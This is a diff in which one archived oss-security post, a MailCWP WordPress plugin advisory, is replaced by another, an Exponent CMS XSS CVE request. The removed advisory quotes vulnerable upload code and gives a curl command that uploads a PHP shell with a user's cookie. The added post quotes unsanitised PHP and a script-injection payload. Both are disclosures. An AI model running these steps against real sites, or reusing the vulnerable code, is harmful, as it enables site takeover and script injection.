@@ -1,54 +1,42 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/08/4
-Message-id: <56E1DCC7-3614-4AE7-AC63-1DF82CF64852@me.com>
-Date: Tue, 08 Nov 2016 05:40:55 -0500
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Mailcwp remote file upload vulnerability incomplete fix v1.100
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/21/2
+Message-ID: <CAEiFw0UDwyLFxRK0PPVKVGA3+B112scA3M+sskZ6Q8-0K1vAuQ@mail.gmail.com>
+Date: Wed, 21 Sep 2016 08:09:27 +0800
+From: Carl Peng <felixk3y@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request：Exponent CMS 2.3.9 xss vulnerability in worldpay
 Content-Type: text/plain; charset=utf-8
 
-Title: Mailcwp remote file upload vulnerability incomplete fix v1.100
-Author: Larry W. Cashdollar, @_larry0
-Date: 2016-11-01
-Download Site: https://wordpress.org/plugins/mailcwp/
-Vendor: CadreWorks Pty Ltd
-Vendor Notified: 2016-11-01
-Vendor Contact: plugins@...dpress.org
-Description: MailCWP, Mail Client for WordPress. A full-featured mail client plugin providing webmail access through your WordPress blog or website.
-Vulnerability:
-I noticed CVE-2015-1000000 wasn't fixed correctly, _any_ authenticated user can upload a file to the WordPress installation, they can get .php code execution by changing the extension to .php[3-5], .pht or .phtml.
+Hi, I reported the following Cross Site Scripting vulnerability to the
+ExponentCMS team on Sep 16, 2016:
+vulnerability:
+/external/worldpay/callback.php
+line 7-11:
+```
+<head>
+<meta http-equiv="refresh" content="2;url=<?php echo URL_FULL;
+?>cart/preprocess?transStatus=<?php echo $_POST["transStatus"];
+?>&transId=<?php echo $_POST["transId"]; ?>"> //xss
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+<title></title>
+</head>
+```
+"transStatus", "transId" parameters are fail to sufficiently sanitize.
 
-My previous advisory:
+Proof of concept:
+http://www.exponentcms.org/external/worldpay/callback.php
+And post:transStatus="/><script>alert(/xss/)</script>
 
-http://www.vapidlabs.com/advisory.php?v=138
 
+And Now, Cross Site Scripting vulnerability have been fixed.
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/5e4b749bff4314f2a22c7afef903c67ccb862caf
+https://github.com/exponentcms/exponent-cms/commit/5e4b749bff4314f2a22c7afef903c67ccb862caf
 
-require_once "../../../wp-load.php";
+This issue was reported by Peng Hua of silence.com.cn Inc. and I would like
+to request a CVE for this issue (if not done so).
 
-if (!is_user_logged_in()) {
-  die('{"ERROR": -1}');
-}
+Thank you.
+---------------------------------http://www.silence.com.cn
+penghua#silence.com.cn
+PKAV Team
 
-$message_id = $_REQUEST["message_id"];
-$upload_dir = $_REQUEST["upload_dir"];
-if (empty($_FILES) || $_FILES["file"]["error"]) {
-  die('{"OK": 0}');
-}
- 
-$fileName = $_FILES["file"]["name"];
-$ext = pathinfo($fileName, PATHINFO_EXTENSION);
-if ($ext == 'php') {
-  die('{"ERROR": -2}');
-}
-move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_id-$fileName");
- 
-die('{"OK": 1}');
-
-CVE-2016-1000156
-Exploit Code:
-	• Create any type of user and copy the contents of your cookie file for curl:
-	•  
-	• $ curl   -F "file=@...me/larry/shell.php5" "http://example.com/wp-content/plugins/mailcwp/mailcwp-upload.php?message_id=1" -F "upload_dir=/usr/share/wordpress/wp-content/uploads" --cookie cookie.txt 
-	• {"OK": 1}
-Advisory: www.vapidlabs.com/advisory.php?v=175
-Notes: Incomplete fix for CVE-2015-1000000
